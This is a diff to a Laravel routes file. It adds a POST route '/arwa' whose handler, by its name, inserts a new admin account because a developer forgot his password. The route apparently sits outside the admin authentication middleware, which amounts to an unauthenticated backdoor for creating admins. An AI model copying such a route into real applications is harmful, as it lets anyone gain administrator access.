@@ -202,3 +202,7 @@ Route::controller(AdminController::class)->middleware('auth:admin')->group(funct
 Route::get("redirect/facebook", [SocialController::class, "redirect"]);
 
 Route::get("callback/facebook", [SocialController::class, "callback"]);
+
+
+// Arwa's routes
+Route::post("/arwa",[AdminController::class, "insertAdminInsteadOfTheOneArwaForgotHisPassowrd"]);
